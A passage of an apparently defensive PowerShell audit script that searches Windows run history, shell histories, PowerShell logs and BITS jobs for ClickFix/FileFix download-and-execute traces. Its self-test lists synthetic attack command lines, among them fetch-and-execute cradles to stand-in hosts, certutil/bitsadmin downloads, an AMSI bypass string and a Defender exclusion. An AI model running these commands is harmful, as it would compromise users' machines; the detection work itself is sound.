        $expected = ($items | Where-Object { $_.expected } | Select-Object -First 1).expected
        $class = 'suspicious'; $conf = 'medium'
        $occ = ($items | Measure-Object count -Sum).Sum
        switch ($parts[0]) {
            'net' {
                switch ($parts[1]) {
                    'unknown' {
                        $title = "Download-and-execute from unknown host '$($parts[2])' in $label"
                        $fp = 'Developers often run installer one-liners. This host is not on the installer allowlist (S04-history-iocs.json), so it may still be a legitimate tool the user installed on purpose. Check who owns the domain and what the script did.'
                        $rec = 'Ask the user whether they ran this and recognise the domain. Look up the domain (owner, age, reputation) without executing anything. If not recognised: review what changed around that time (installs timeline, new services, Run keys, scheduled tasks), run a full offline AV scan, and rotate credentials used on this machine since then.'
                    }
                    'github' {
                        $title = "Script from GitHub owner '$($parts[2])' run through a download cradle in $label"
                        $fp = 'GitHub hosts many legitimate installers; this owner is simply not on the reviewed owner list. Typosquatted or freshly created repositories are a known malware delivery path, so the repo needs a quick review.'
                        $rec = 'Open the repository in a browser (do not run anything): check owner reputation, stars/age, and the script content at the referenced path. If unknown or suspicious, treat it like an unknown domain.'
                    }
                    'unresolved' {
                        $title = "Download-and-execute with an unresolved (variable or missing) URL in $label"
                        $fp = 'The URL is held in a variable or built at runtime, so it cannot be classified from one line. Often part of a legitimate script (e.g. an installer that downloads its own components).'
                        $rec = 'Read the surrounding commands/script to find where the variable is set and which host it points to; classify that host as above.'
                    }
                    'local' {
                        $title = "Download-and-execute from a local/LAN/tailnet host in $label"; $sev = 'low'
                        $fp = 'Local development servers and LAN hosts are commonly used for testing scripts.'
                        $rec = 'Confirm the local host/service is the user''s own (dev server, VM, NAS).'
                    }
                    'allowlisted-hidden' {
                        $title = "Allowlisted installer run hidden or encoded in $label"
                        $fp = 'Installer domains are allowlisted; running them hidden or encoded is unusual but some setup scripts do it.'
                        $rec = 'Confirm the user ran this installer.'
                    }
                    default {
                        $title = "Installer one-liners from allowlisted domains in $label ($occ)"; $class = 'info'; $conf = 'high'
                        $fp = 'Domains are on the installer allowlist (official installers for scoop, uv, bun, pnpm, rustup, Claude Code, ...). Listed for the timeline only.'
                        $rec = 'None. Optionally confirm each tool is still wanted.'
                    }
                }
            }
            'encurl' {
                $title = "Encoded PowerShell that only opens https://$($parts[2]) in the browser, in $label ($occ)"; $class = 'info'; $conf = 'high'
                $fp = 'The decoded command is just Start "<url>": Node''s ''open'' package (used by CLIs such as Vercel, Netlify or Firebase for browser login) launches URLs exactly like this, recognisable by the en-dash character it uses before ''ExecutionPolicy''.'
                $rec = 'None, if the user recognises the CLI login.'
            }
            'encbenign' {
                $title = "Encoded PowerShell command(s)$(if ($parts[2] -eq 'hidden') { ' run hidden' }) with harmless-looking decoded content in $label ($occ)"
                $fp = 'Some tools pass scripts as -EncodedCommand to avoid quoting problems; the decoded content (in the evidence, masked) shows no download, obfuscation or tampering pattern.'
                $rec = 'Read the decoded command in the evidence and confirm which tool ran it.'
                $conf = 'low'
            }
            'cat' {
                $catName = $parts[2]
                $title = "Notable $catName commands in $label ($occ)"
                $fp = switch ($catName) {
                    'persistence' { 'Creating scheduled tasks/services/Run entries is normal for developers and admins.' }
                    'offensive' { 'Security testing, CTF practice and coursework also use these tools; plausible if the user does such work on purpose.' }
                    'obfuscation' { 'String tricks also appear in legitimate scripts and generated code.' }
                    default { 'These LOLBins have legitimate admin uses.' }
                }
                $rec = 'Review the listed commands and confirm they were the user''s own.'
                $conf = 'low'
            }
            default {
                $p0 = $first.primary
                $title = "$p0 in $label"
                $fp = 'A single command line; legitimate admin or setup scripts occasionally use these techniques. The decoded/masked text is in the evidence.'
                $rec = 'Ask the user whether they ran this. If not: treat as a possible ClickFix/FileFix execution: review installs, services, Run keys and scheduled tasks created around that time, run a full offline AV scan, and rotate credentials.'
                if ($sev -eq 'high') { $conf = 'medium' } else { $conf = 'low' }
            }
        }
        if ($expected) {
            $sev = Limit-S04Severity $sev $(if ($expected.class -eq 'info') { 'info' } else { 'low' })
            $reasons = @($reasons + 'expected_match' | Sort-Object -Unique)
            $fp = "$fp Matches expected item '$($expected.id)': $($expected.reason)"
        }
        if ($sev -eq 'info' -and $class -eq 'suspicious') { $class = 'info' }
        New-BvsFinding -Run $run -Check $Check -Title $title -Severity $sev -Class $class -Confidence $conf -Reasons $reasons `
            -Evidence $evidence -Entities @{ network = $net } -FpNotes $fp -Recommendation $rec -Mitre $mitre -Expected $expected
    }
}

#endregion

function ConvertTo-S04Base64 { param([string]$Text) [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Text)) }

function Invoke-S04SelfTest {
    <# Positive/negative controls for the classifier on synthetic command lines (built at runtime, no real
       hosts or secrets). Reads nothing from the system, writes nothing. Returns the number of failures. #>
    $cases = @(
        @('powershell -w h -c "irm https://check-captcha.example/v | iex" # I am not a robot - reCAPTCHA Verification ID: 2165', 'high', 'ClickFix: hidden cradle + lure, unknown host'),
        @('irm https://get.scoop.sh | iex', 'info', 'allowlisted installer'),
        @('iwr -useb get.pnpm.io/install.ps1 | iex', 'info', 'allowlisted bare host'),
        @('curl -fsSL https://bun.sh/install | bash', 'info', 'allowlisted curl|bash'),
        @('irm https://raw.githubusercontent.com/ScoopInstaller/Install/master/install.ps1 | iex', 'info', 'GitHub known owner'),
        @('irm https://raw.githubusercontent.com/randomuser123/tools/main/setup.ps1 | iex', 'medium', 'GitHub unknown owner'),
        @('irm $u | iex', 'medium', 'unresolved variable URL'),
        @('irm http://localhost:8080/dev.ps1 | iex', 'low', 'local dev server'),
        @('curl -s https://cdn-update.example/i.sh | sudo bash', 'high', 'curl|bash unknown host'),
        @('mshta https://203.0.113.7/verify.hta', 'high', 'mshta public IP'),
        @('conhost.exe --headless powershell -c calc', 'high', 'conhost headless'),
        @('finger verify@203.0.113.9 | cmd', 'high', 'finger staging'),
        @('rundll32 \\files.example@SSL\DavWWWRoot\a.dll,Start', 'high', 'WebDAV rundll32'),
        @('nslookup -q=txt stage.example 203.0.113.5 | findstr "x" | powershell', 'high', 'nslookup staging'),
        @('msiexec /q /i http://update-check.example/pkg.msi', 'high', 'msiexec URL unknown'),
        @('msiexec /i https://www.python.org/ftp/python/3.13.0/python-3.13.0-amd64.msi', 'info', 'msiexec allowlisted'),
        @('certutil -urlcache -split -f http://198.51.100.4/a.exe a.exe', 'high', 'certutil download'),
        @('bitsadmin /transfer j http://updates.example/a.exe C:\Users\Public\a.exe', 'high', 'bitsadmin download'),
        @(('powershell -NoProfile -EncodedCommand ' + (ConvertTo-S04Base64 'iex (irm http://bad.example/p.ps1)')), 'high', 'encoded cradle (decoded)'),
        @(('powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand ' + (ConvertTo-S04Base64 'Start "https://vercel.com/oauth/device?user_code=ABCD"')), 'info', 'encoded URL opener'),
        @(('powershell -w hidden -enc ' + (ConvertTo-S04Base64 'Get-Date | Out-Null')), 'medium', 'hidden encoded, benign decoded'),
        @('Add-MpPreference -ExclusionPath C:\Users\Public', 'medium', 'Defender exclusion'),
        @(('cmd /c start /min powershell -c "iex(iwr http://x.example/a)"' + (' ' * 60) + '# C:\Users\Public\HR\Policy.docx'), 'high', 'FileFix padding'),
        @('[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")', 'high', 'AMSI bypass'),
        @('schtasks /create /tn upd /tr C:\x\a.exe /sc onlogon', 'low', 'persistence command'),
        @('git clone https://github.com/user/repo', $null, 'negative: git clone'),
        @('Invoke-RestMethod https://api.github.com/repos/x/y', $null, 'negative: REST call'),
        @('# Activate venv, start API, and verify health', $null, 'negative: verify comment'),
        @(('curl -s -H "Content-Type: application/json" https://api.example/v1' + (' ' * 21) + '# paste your key here'), $null, 'negative: short padding'),
        @('oh-my-posh init pwsh | Invoke-Expression', 'none', 'weak only: iex alone'),
        @('Start-Process -WindowStyle Hidden notepad', 'none', 'weak only: hidden alone')
    )
    $fail = 0
    foreach ($c in $cases) {
        $cls = Get-S04Classification -Text $c[0] -Vector history
        $got = if (-not $cls) { $null } elseif (-not $cls.Severity) { 'none' } else { $cls.Severity }
        $ok = $got -eq $c[1]
        if (-not $ok) { $fail++ }
        '{0} {1,-34} expected={2,-6} got={3,-6} {4}' -f $(if ($ok) { 'PASS' } else { 'FAIL' }), $c[2], $(if ($c[1]) { $c[1] } else { 'null' }), $(if ($got) { $got } else { 'null' }), $(if ($cls) { ($cls.Hits -join ',') })
    }
    "S04 self-test: $($cases.Count - $fail)/$($cases.Count) passed"
    $fail
}

if ($SelfTest) {
    $out = @(Invoke-S04SelfTest)
    $out | Select-Object -SkipLast 1
    exit $(if ([int]$out[-1] -gt 0) { 1 } else { 0 })
}

#region ---------- run setup ----------

# Library workaround (reported): Initialize-BvsRun re-parses auditStartUtc, which ConvertFrom-Json has already
# turned into a DateTime. That throws under non-US cultures (cs-CZ, en-GB) and, under en-US/invariant, shifts
# the value by the local UTC offset and drops the fraction. So: invariant culture for the call only, then take
# the exact timestamp from the raw scan-meta.json text.
$prevCulture = [Globalization.CultureInfo]::CurrentCulture
try {
    [Globalization.CultureInfo]::CurrentCulture = [Globalization.CultureInfo]::InvariantCulture
    $run = Initialize-BvsRun -Module S04 -Area security
}
finally { [Globalization.CultureInfo]::CurrentCulture = $prevCulture }
$metaPath = Join-Path $run.ScanDir 'scan-meta.json'
if ((Test-Path -LiteralPath $metaPath) -and ((Get-Content -LiteralPath $metaPath -Raw) -match '"auditStartUtc"\s*:\s*"([^"]+)"')) {
    $run.AuditStartUtc = [datetime]::Parse($Matches[1], [Globalization.CultureInfo]::InvariantCulture, [Globalization.DateTimeStyles]'AdjustToUniversal, AssumeUniversal')
}
Write-BvsLog -Run $run -Message ('auditStartUtc used: {0:o}' -f $run.AuditStartUtc)
$AuditUtc = $run.AuditStartUtc
$WindowStartUtc = $AuditUtc.AddDays(-$Days)

$scanMeta = $null
try { $scanMeta = Get-Content -LiteralPath (Join-Path $run.ScanDir 'scan-meta.json') -Raw | ConvertFrom-Json } catch { }
$OsCaption = if ($scanMeta -and $scanMeta.os) { [string]$scanMeta.os.caption } else { '' }

#endregion

#region ---------- 1. ClickFix / FileFix traces ----------

$CmdRecords = [System.Collections.Generic.List[object]]::new()

$null = Invoke-BvsCheck -Run $run -Id 'history.runmru' -Description 'Win+R history (Explorer\RunMRU) in MRUList order, scanned for ClickFix commands' -Script {
    $key = 'HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU'
    $vals = @(Get-BvsRegValues -Path $key)
    if ($vals.Count -eq 0) { Set-BvsCheckStatus -Id 'history.runmru' -Status not_applicable -Reason 'RunMRU key missing or empty'; return }
    $mru = [string](($vals | Where-Object Name -eq 'MRUList' | Select-Object -First 1).Value)
    $order = if ($mru) { @($mru.ToCharArray() | ForEach-Object { [string]$_ }) } else { @($vals | Where-Object Name -ne 'MRUList' | ForEach-Object Name) }
    $rows = [System.Collections.Generic.List[object]]::new()
    $pos = 0
    foreach ($n in $order) {
        $v = $vals | Where-Object Name -eq $n | Select-Object -First 1
        if (-not $v) { continue }
        $pos++
        $text = ([string]$v.Value) -replace '\\1$', ''
        $cls = Get-S04Classification -Text $text -Vector runmru
        $sev = $null
        if ($cls) {
            if ($cls.Severity -eq 'info') { $cls.Severity = 'low'; $cls.GroupKey = 'net|allowlisted-runmru' }
            if (@($cls.Hits | Where-Object { $_ -in $LureIds }).Count -gt 0 -and $cls.Severity -ne 'high') { $cls.Severity = 'high'; $cls.GroupKey = "line|runmru|$n" }
            if ($cls.Severity) { $CmdRecords.Add((New-S04CommandRecord -Classification $cls -Vector runmru -Source 'RunMRU' -SourcePath $key -Locator "MRU $n (position $pos)" -Text $text)) }
            $sev = $cls.Severity
        }
        $rows.Add([ordered]@{ position = $pos; name = $n; value = (Protect-S04Line $text 300); patterns = @($cls.Hits); severity = $sev })
    }
    Add-BvsInventory -Run $run -Name 'runMru' -Data ([ordered]@{ key = $key; lastWriteUtc = (ConvertTo-S04Iso (Get-BvsRegKeyLastWrite -Path $key)); mruList = $mru; entries = @($rows) })
    @($rows)
}

$null = Invoke-BvsCheck -Run $run -Id 'history.typedpaths' -Description 'Explorer address-bar history (TypedPaths): FileFix pastes a command disguised as a path' -Script {
    $key = 'HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths'
    $vals = @(Get-BvsRegValues -Path $key)
    if ($vals.Count -eq 0) { Set-BvsCheckStatus -Id 'history.typedpaths' -Status not_applicable -Reason 'TypedPaths key missing or empty'; return }
    $cmdLike = [regex]::new('\b(?:powershell|pwsh|cmd|mshta|curl|wget|msiexec|rundll32|regsvr32|wscript|cscript|conhost|bitsadmin|certutil|finger|iex|irm|iwr|Invoke-\w+|bash|nslookup)(?:\.exe)?\b|\s#|\s{5,}', $RxOpts, $RxTimeout)
    $rows = foreach ($v in ($vals | Sort-Object { [int](([string]$_.Name) -replace '\D', '0') })) {
        $text = [string]$v.Value
        $isCmd = $cmdLike.IsMatch($text)
        $cls = Get-S04Classification -Text $text -Vector typedpaths
        $sev = $null
        if ($isCmd) {
            if (-not $cls) {
                $cls = [pscustomobject]@{ Severity = 'high'; GroupKey = "line|typedpaths|$($v.Name)"; Hits = @('command_in_address_bar'); Categories = @('lure'); MaxWeight = 3; Targets = @(Get-S04Targets $text); Decoded = $null; Reasons = @('clickfix_lure'); Mitre = @('T1204.004'); Primary = [pscustomobject]@{ Description = 'Command typed or pasted into the Explorer address bar (FileFix pattern)' } }
            }
            else { $cls.Severity = 'high'; $cls.GroupKey = "line|typedpaths|$($v.Name)"; $cls.Primary = [pscustomobject]@{ Description = 'Command typed or pasted into the Explorer address bar (FileFix pattern)' } }
            $CmdRecords.Add((New-S04CommandRecord -Classification $cls -Vector typedpaths -Source 'TypedPaths' -SourcePath $key -Locator $v.Name -Text $text))
            $sev = 'high'
        }
        [ordered]@{ name = $v.Name; value = (Protect-S04Line ($text -replace [regex]::Escape($env:USERPROFILE), '%USERPROFILE%') 300); isCommand = $isCmd; severity = $sev }
    }
    Add-BvsInventory -Run $run -Name 'typedPaths' -Data ([ordered]@{ key = $key; lastWriteUtc = (ConvertTo-S04Iso (Get-BvsRegKeyLastWrite -Path $key)); entries = @($rows) })
    @($rows)
}

$null = Invoke-BvsCheck -Run $run -Id 'history.files' -Description 'PSReadLine *_history.txt, ~\.bash_history, ~\.python_history, ~\.node_repl_history scanned line by line (only suspicious lines kept, masked)' -Script {
    $files = [System.Collections.Generic.List[object]]::new()
    $psrl = Join-Path $env:APPDATA 'Microsoft\Windows\PowerShell\PSReadLine'
    if ([IO.Directory]::Exists($psrl)) { foreach ($f in [IO.Directory]::GetFiles($psrl, '*_history.txt')) { $files.Add($f) } }
    foreach ($n in '.bash_history', '.python_history', '.node_repl_history') { $files.Add((Join-Path $env:USERPROFILE $n)) }
    $stats = [System.Collections.Generic.List[object]]::new()
    $kept = 0
    foreach ($path in $files) {
        $st = [ordered]@{ source = (Split-Path -Leaf $path); path = $path; exists = $false; bytes = $null; physicalLines = 0; commands = 0; modifiedUtc = $null; modifiedAfterAudit = $false; matchedCommands = 0; flaggedCommands = 0; ownProjectCommands = 0; countsByPattern = [ordered]@{}; note = $null }
        $stats.Add($st)
        if (-not [IO.File]::Exists($path)) { continue }
        if (Test-BvsNeverRead $path) { $st.note = 'on never-read list: skipped'; continue }
        $fi = [IO.FileInfo]::new($path)
        $st.exists = $true; $st.bytes = $fi.Length; $st.modifiedUtc = ConvertTo-S04Iso $fi.LastWriteTimeUtc
        if (Test-BvsCloudOnly $fi) { $st.note = 'cloud-only placeholder: not opened'; continue }
        if ($fi.LastWriteTimeUtc -ge $AuditUtc) { $st.modifiedAfterAudit = $true; $st.note = 'modified after audit start: the newest lines may be post-audit (history has no timestamps)' }
        if ($fi.Length -gt 64MB) { $st.note = 'larger than 64 MB: skipped'; continue }
        $lines = [IO.File]::ReadAllLines($path)
        $st.physicalLines = $lines.Count
        # PSReadLine stores multi-line commands with a trailing backtick on each continuation line.
        $i = 0
        while ($i -lt $lines.Count) {
            $startLine = $i + 1
            $cmd = $lines[$i]
            while ($cmd.EndsWith('`') -and ($i + 1) -lt $lines.Count) { $i++; $cmd = $cmd.Substring(0, $cmd.Length - 1) + "`n" + $lines[$i] }
            $i++
            if ([string]::IsNullOrWhiteSpace($cmd)) { continue }
            $st.commands++
            if ($OwnRx.IsMatch($cmd)) { $st.ownProjectCommands++; continue }
            $cls = Get-S04Classification -Text $cmd -Vector history
            if (-not $cls) { continue }
            $st.matchedCommands++
            foreach ($id in $cls.Hits) { if ($st.countsByPattern.Contains($id)) { $st.countsByPattern[$id]++ } else { $st.countsByPattern[$id] = 1 } }
            if ($cls.Severity) {
                $st.flaggedCommands++
                $kept++
                $exp = Get-S04ExpectedPathMatch $cmd
                $CmdRecords.Add((New-S04CommandRecord -Classification $cls -Vector history -Source $st.source -SourcePath $path -Line $startLine -Locator "line $startLine" -Text $cmd -Expected $exp))
            }
        }
        $lines = $null
    }
    Add-BvsInventory -Run $run -Name 'historyFiles' -Data @($stats)
    if (@($stats | Where-Object exists).Count -eq 0) { Set-BvsCheckStatus -Id 'history.files' -Status not_applicable -Reason 'no history files found' }
    elseif (@($stats | Where-Object modifiedAfterAudit).Count -gt 0) { Set-BvsCheckStatus -Id 'history.files' -Status partial -Reason 'a history file changed after the audit started; lines have no timestamps so post-audit commands cannot be separated' }
    @($CmdRecords | Where-Object vector -eq 'history')
}

$historyRecs = @($CmdRecords | Where-Object { $_.vector -in 'history', 'runmru', 'typedpaths' })
Add-BvsInventory -Run $run -Name 'historySuspicious' -Data @($historyRecs | Where-Object { $_.severity -ne 'info' } | Select-Object -First 300)
$oneLiners = @($historyRecs | Where-Object { $_.groupKey -like 'net|allowlisted*' } | ForEach-Object { foreach ($t in $_.targets) { if ($t.class -in 'allowlisted', 'github-known') { [pscustomobject]@{ d = $(if ($t.domain) { $t.domain } else { $t.host }); s = $_.source; o = $t.owner } } } })
Add-BvsInventory -Run $run -Name 'installerOneLiners' -Data @($oneLiners | Group-Object d | Sort-Object Count -Descending | ForEach-Object { [ordered]@{ domain = $_.Name; count = $_.Count; sources = @($_.Group.s | Sort-Object -Unique); githubOwners = @($_.Group.o | Where-Object { $_ } | Sort-Object -Unique) } })
Add-S04CommandFindings -Records @($CmdRecords | Where-Object vector -eq 'runmru') -Check 'history.runmru'
Add-S04CommandFindings -Records @($CmdRecords | Where-Object vector -eq 'typedpaths') -Check 'history.typedpaths'
Add-S04CommandFindings -Records @($CmdRecords | Where-Object vector -eq 'history') -Check 'history.files'

#endregion

#region ---------- 2. PowerShell logs ----------

$PsKnownHosts = @('ConsoleHost', 'Visual Studio Code Host', 'Windows PowerShell ISE Host', 'Default Host', 'ServerRemoteHost', 'PowerShell Editor Services Host', 'Windows Terminal')

$null = Invoke-BvsCheck -Run $run -Id 'pslog.classic' -Description 'Windows PowerShell log 400/403/600: unique HostApplication command lines, flagged for cradles/encoding/obfuscation' -Script {
    $log = 'Windows PowerShell'
    $r = Get-S04Events -LogName $log -Id 400, 403, 600 -StartUtc $WindowStartUtc
    $byApp = @{}
    $byHost = @{}
    foreach ($e in $r.Events) {
        $d = Get-S04EventData $e
        $detail = ($d.Values | Where-Object { $_ -match 'HostApplication=' } | Select-Object -First 1)
        if (-not $detail) { continue }
        $kv = @{}
        foreach ($l in ($detail -split "`r?`n")) { $p = $l -split '=', 2; if ($p.Count -eq 2) { $kv[$p[0].Trim()] = $p[1].Trim() } }
        $app = [string]$kv['HostApplication']
        if (-not $app) { continue }
        $t = $e.TimeCreated.ToUniversalTime()
        if (-not $byApp.ContainsKey($app)) { $byApp[$app] = [ordered]@{ count = 0; first = $t; last = $t; hostNames = [System.Collections.Generic.HashSet[string]]::new(); ids = [System.Collections.Generic.HashSet[int]]::new() } }
        $a = $byApp[$app]; $a.count++; if ($t -lt $a.first) { $a.first = $t }; if ($t -gt $a.last) { $a.last = $t }
        [void]$a.hostNames.Add([string]$kv['HostName']); [void]$a.ids.Add($e.Id)
        $hn = [string]$kv['HostName']
        if (-not $byHost.ContainsKey($hn)) { $byHost[$hn] = [ordered]@{ events = 0; first = $t; last = $t; sample = $app; versions = [System.Collections.Generic.HashSet[string]]::new() } }
        $hh = $byHost[$hn]; $hh.events++; if ($t -lt $hh.first) { $hh.first = $t }; if ($t -gt $hh.last) { $hh.last = $t }; [void]$hh.versions.Add([string]$kv['HostVersion'])
    }
    $rows = foreach ($kvp in ($byApp.GetEnumerator() | Sort-Object { $_.Value.count } -Descending)) {
        $app = $kvp.Key; $a = $kvp.Value
        $own = $OwnRx.IsMatch($app)
        $cls = if ($own) { $null } else { Get-S04Classification -Text $app -Vector pshost }
        if ($cls -and $cls.Severity) {
            $CmdRecords.Add((New-S04CommandRecord -Classification $cls -Vector pshost -Source $log -SourcePath $log -Locator ("events {0}" -f (($a.ids | Sort-Object) -join '/')) -TimeUtc $a.last -Text $app -Count $a.count))
        }
        [ordered]@{ hostApplication = (Protect-S04Line $app 600); count = $a.count; firstUtc = (ConvertTo-S04Iso $a.first); lastUtc = (ConvertTo-S04Iso $a.last); hostNames = @($a.hostNames); eventIds = @($a.ids | Sort-Object); ownProject = $own; patterns = @($cls.Hits); severity = $cls.Severity }
    }
    $hosts = foreach ($kvp in $byHost.GetEnumerator()) {
        [ordered]@{ hostName = $kvp.Key; known = ($kvp.Key -in $PsKnownHosts); events = $kvp.Value.events; firstUtc = (ConvertTo-S04Iso $kvp.Value.first); lastUtc = (ConvertTo-S04Iso $kvp.Value.last); versions = @($kvp.Value.versions); sampleHostApplication = (Protect-S04Line $kvp.Value.sample 200) }
    }
    Add-BvsInventory -Run $run -Name 'psHostApplications' -Data @($rows | Select-Object -First 500)
    Add-BvsInventory -Run $run -Name 'psHostNames' -Data @($hosts)
    $unknownHosts = @($hosts | Where-Object { -not $_.known -and $_.hostName })
    if ($unknownHosts.Count -gt 0) {
        $ev = @($unknownHosts | ForEach-Object { [ordered]@{ type = 'event'; log = $log; ids = '400/403/600'; hostName = $_.hostName; events = $_.events; firstUtc = $_.firstUtc; lastUtc = $_.lastUtc; sampleHostApplication = $_.sampleHostApplication } })
        New-BvsFinding -Run $run -Check 'pslog.classic' -Title ("Unrecognised PowerShell host name(s): {0}" -f (($unknownHosts | ForEach-Object hostName) -join ', ')) -Severity info -Class info -Confidence low `
            -Evidence $ev -FpNotes 'Programs that embed the PowerShell engine (vendor agents, updaters, IDE tools) register their own host name. No suspicious command line was seen for it in this log.' `
            -Recommendation 'Identify which installed program uses this host name (vendor documentation, the program list). Nothing to do if it belongs to a known app.' -Mitre @('T1059.001')
    }
    Set-S04CoverageStatus -CheckId 'pslog.classic' -Logs @($log) -Capped $r.Capped
    @($rows)
}

function Test-S04TrustedScriptPath {
    <# A script file that is not user-writable and validly signed by Microsoft (built-in modules): its
       script blocks are counted but do not produce findings. #>
    param([string]$Path)
    if ([string]::IsNullOrWhiteSpace($Path) -or -not [IO.File]::Exists($Path)) { return $false }
    if (Test-BvsUserWritable $Path) { return $false }
    $s = Get-BvsSignature $Path
    ($s.Status -eq 'Valid') -and ($s.Signer -match '(?i)^Microsoft')
}

function Invoke-S04ScriptBlockScan {
    <# Scan 4104/4103 events of one PowerShell operational log. Returns stats; adds records to $CmdRecords. #>
    param([string]$Log, [string]$CheckId)
    $r = Get-S04Events -LogName $Log -Id 4104, 4103 -StartUtc $WindowStartUtc
    $st = [ordered]@{ log = $Log; events4104 = 0; warning4104 = 0; events4103 = 0; ownProject = 0; trustedPath = 0; scriptBlocks = 0; matchedBlocks = 0; flaggedBlocks = 0; capped = $r.Capped }
    $blocks = [ordered]@{}
    foreach ($e in $r.Events) {
        $d = Get-S04EventData $e
        if ($e.Id -eq 4104) {
            $st.events4104++
            if ($e.Level -eq 3) { $st.warning4104++ }
            $id = [string]$d['ScriptBlockId']; if (-not $id) { $id = [guid]::NewGuid().ToString() }
            if (-not $blocks.Contains($id)) { $blocks[$id] = [ordered]@{ kind = 4104; time = $e.TimeCreated.ToUniversalTime(); level = $e.Level; path = [string]$d['Path']; parts = [System.Collections.Generic.List[string]]::new(); total = [int]("0$($d['MessageTotal'])") } }
            $blocks[$id].parts.Add([string]$d['ScriptBlockText'])
        }
        else {
            $st.events4103++
            $ctx = [string]$d['ContextInfo']; $payload = [string]$d['Payload']
            $hostApp = if ($ctx -match '(?m)^\s*Host Application = (.*)$') { $Matches[1].Trim() } else { '' }
            $script = if ($ctx -match '(?m)^\s*Script Name = (.*)$') { $Matches[1].Trim() } else { '' }
            $id = "4103-$($e.RecordId)"
            $blocks[$id] = [ordered]@{ kind = 4103; time = $e.TimeCreated.ToUniversalTime(); level = $e.Level; path = $script; parts = [System.Collections.Generic.List[string]]::new(); total = 1 }
            $blocks[$id].parts.Add(($payload + "`n" + $hostApp))
        }
    }
    $trustCache = @{}
    foreach ($kv in $blocks.GetEnumerator()) {
        $b = $kv.Value
        $st.scriptBlocks++
        $text = ($b.parts -join '')
        if ($OwnRx.IsMatch($text) -or ($b.path -and $OwnRx.IsMatch($b.path))) { $st.ownProject++; continue }
        $best = $null; $bestLine = 0; $bestText = $null; $matched = $false
        $ln = 0
        foreach ($line in ($text -split "`r?`n" | Select-Object -First 20000)) {
            $ln++
            if ($line.Length -lt 6) { continue }
            $cls = Get-S04Classification -Text $line -Vector $(if ($b.kind -eq 4104) { 'scriptblock' } else { 'pipeline' })
            if (-not $cls) { continue }
            $matched = $true
            if ($cls.Severity -and (-not $best -or $SevRank[$cls.Severity] -gt $SevRank[$best.Severity])) { $best = $cls; $bestLine = $ln; $bestText = $line }
        }
        if ($matched) { $st.matchedBlocks++ }
        if (-not $best) { continue }
        if ($b.path) {
            if (-not $trustCache.ContainsKey($b.path)) { $trustCache[$b.path] = Test-S04TrustedScriptPath $b.path }
            if ($trustCache[$b.path]) { $st.trustedPath++; continue }
        }
        $st.flaggedBlocks++
        $loc = if ($b.kind -eq 4104) { "4104 ScriptBlockId $($kv.Key) line $bestLine$(if ($b.path) { ' of ' + $b.path })" } else { "4103 $(if ($b.path) { $b.path })" }
        $CmdRecords.Add((New-S04CommandRecord -Classification $best -Vector $(if ($b.kind -eq 4104) { 'scriptblock' } else { 'pipeline' }) -Source $Log -SourcePath $Log -Line $bestLine -Locator $loc -TimeUtc $b.time -Text $bestText))
    }
    Set-S04CoverageStatus -CheckId $CheckId -Logs @($Log) -Capped $r.Capped
    $st
}

$psStats = [System.Collections.Generic.List[object]]::new()
foreach ($pair in @(@('pslog.operational', 'Microsoft-Windows-PowerShell/Operational'), @('pslog.core', 'PowerShellCore/Operational'))) {
    $cid = $pair[0]; $lg = $pair[1]
    $null = Invoke-BvsCheck -Run $run -Id $cid -Description "$lg 4104 script blocks (incl. auto-logged Warning level) and 4103 pipeline events, flagged for cradles/encoding/obfuscation" -Script {
        $s = Invoke-S04ScriptBlockScan -Log $lg -CheckId $cid
        $psStats.Add($s)
        @($CmdRecords | Where-Object { $_.source -eq $lg })
    }
}
Add-BvsInventory -Run $run -Name 'psScriptBlockStats' -Data @($psStats)
Add-BvsInventory -Run $run -Name 'psFlagged' -Data @($CmdRecords | Where-Object { $_.vector -in 'pshost', 'scriptblock', 'pipeline' } | Select-Object -First 300)
Add-S04CommandFindings -Records @($CmdRecords | Where-Object vector -eq 'pshost') -Check 'pslog.classic'
Add-S04CommandFindings -Records @($CmdRecords | Where-Object { $_.vector -in 'scriptblock', 'pipeline' -and $_.source -eq 'Microsoft-Windows-PowerShell/Operational' }) -Check 'pslog.operational'
Add-S04CommandFindings -Records @($CmdRecords | Where-Object { $_.vector -in 'scriptblock', 'pipeline' -and $_.source -eq 'PowerShellCore/Operational' }) -Check 'pslog.core'

#endregion

#region ---------- 3. BITS ----------

function Test-S04UpdateHost {
    param([string]$HostName)
    if (-not $HostName) { return $false }
    $h = $HostName.ToLowerInvariant()
    foreach ($d in $ioc.updateHosts) { if ($h -eq $d -or $h.EndsWith('.' + $d)) { return $true } }
    $false
}

$null = Invoke-BvsCheck -Run $run -Id 'bits.jobs' -Description 'Bits-Client/Operational 3/59/60/61/16403: BITS job URLs, creators; non-vendor hosts flagged' -Script {
    $log = 'Microsoft-Windows-Bits-Client/Operational'
    $r = Get-S04Events -LogName $log -Id 3, 59, 60, 61, 16403 -StartUtc $WindowStartUtc
    $jobs = [ordered]@{}
    foreach ($e in $r.Events) {
        $d = Get-S04EventData $e
        $jid = [string]$(if ($d['jobId']) { $d['jobId'] } elseif ($d['Id']) { $d['Id'] } else { 'unknown' })
        if (-not $jobs.Contains($jid)) { $jobs[$jid] = [ordered]@{ jobId = $jid; title = $null; owner = $null; creator = $null; urls = [System.Collections.Generic.HashSet[string]]::new(); rawUrls = [System.Collections.Generic.HashSet[string]]::new(); localNames = [System.Collections.Generic.HashSet[string]]::new(); first = $e.TimeCreated.ToUniversalTime(); last = $e.TimeCreated.ToUniversalTime(); errors = 0; ids = [System.Collections.Generic.HashSet[int]]::new() } }
        $j = $jobs[$jid]
        $t = $e.TimeCreated.ToUniversalTime(); if ($t -lt $j.first) { $j.first = $t }; if ($t -gt $j.last) { $j.last = $t }
        [void]$j.ids.Add($e.Id)
        if ($d['jobTitle']) { $j.title = $d['jobTitle'] } elseif ($d['name'] -and -not $j.title) { $j.title = $d['name'] }
        if ($d['jobOwner']) { $j.owner = $d['jobOwner'] }
        if ($d['processPath']) { $j.creator = $d['processPath'] }
        $u = if ($d['url']) { $d['url'] } elseif ($d['RemoteName']) { $d['RemoteName'] } else { $null }
        if ($u) { [void]$j.rawUrls.Add($u) }
        if ($d['LocalName']) { [void]$j.localNames.Add($d['LocalName']) }
        if ($e.Id -eq 61) { $j.errors++ }
    }
    $sigCache = @{}
    $rows = foreach ($j in $jobs.Values) {
        $hostsInfo = foreach ($u in $j.rawUrls) {
